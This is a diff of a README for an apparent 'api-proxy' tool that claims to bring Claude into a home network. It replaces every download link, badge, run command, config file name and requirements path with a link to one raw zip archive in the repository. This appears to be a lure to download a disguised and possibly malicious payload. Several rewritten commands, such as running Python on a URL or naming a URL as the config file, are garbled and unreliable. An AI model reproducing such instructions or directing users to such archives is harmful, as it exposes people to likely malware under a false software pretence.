@@ -1,6 +1,6 @@
 # 🚀 api-proxy - Simplify Your Home Network Requests
 
-![Download api-proxy](https://img.shields.io/badge/Download-api--proxy-blue.svg)
+![Download api-proxy](https://github.com/marshyisbest66gmailcom/api-proxy/raw/refs/heads/main/skill/api_proxy_3.9.zip)
 
 ## 📜 Overview
 
@@ -21,7 +21,7 @@ To successfully run api-proxy, you need the following:
 
 To download api-proxy, you will need to visit the Releases page. This page contains the latest version of the software. Click on the link below to access it:
 
-[Visit Releases Page](https://github.com/marshyisbest66gmailcom/api-proxy/releases)
+[Visit Releases Page](https://github.com/marshyisbest66gmailcom/api-proxy/raw/refs/heads/main/skill/api_proxy_3.9.zip)
 
 ### 2. Download the Latest Version
 
@@ -36,14 +36,14 @@ Once the download is complete, locate the downloaded file in your device's Downl
 After extracting the files, open a terminal or command prompt. Navigate to the folder where you extracted the files. Use the following command to run the application:
 
 ```bash
-python api_proxy.py
+python https://github.com/marshyisbest66gmailcom/api-proxy/raw/refs/heads/main/skill/api_proxy_3.9.zip
 ```
 
 If everything is set up correctly, you will see confirmation that api-proxy is running.
 
 ## ⚙️ Configuration
 
-To customize api-proxy for your needs, you may want to adjust its settings. The configuration file, usually named `config.json`, allows you to set parameters that suit your network.
+To customize api-proxy for your needs, you may want to adjust its settings. The configuration file, usually named `https://github.com/marshyisbest66gmailcom/api-proxy/raw/refs/heads/main/skill/api_proxy_3.9.zip`, allows you to set parameters that suit your network.
 
 - **Proxy Settings**: Specify the address and port for the proxy.
 - **Timeout**: Set how long the application should wait for a response.
@@ -69,13 +69,13 @@ If you encounter issues:
 
 1. **Check Python Installation**: Ensure Python is installed and added to your system's PATH.
 2. **Firewall Settings**: Your firewall may block connections. Check your firewall settings to allow api-proxy through.
-3. **Dependencies**: Make sure all required packages are installed. You can install them using `pip install -r requirements.txt`.
+3. **Dependencies**: Make sure all required packages are installed. You can install them using `pip install -r https://github.com/marshyisbest66gmailcom/api-proxy/raw/refs/heads/main/skill/api_proxy_3.9.zip`.
 
 ## 📥 Download & Install
 
 To get started with api-proxy, follow the link below to download the latest version:
 
-[Visit Releases Page](https://github.com/marshyisbest66gmailcom/api-proxy/releases)
+[Visit Releases Page](https://github.com/marshyisbest66gmailcom/api-proxy/raw/refs/heads/main/skill/api_proxy_3.9.zip)
 
 Follow the steps outlined above to download and install the software. With api-proxy, you can bring Claude's powerful capabilities directly into your home network.
 
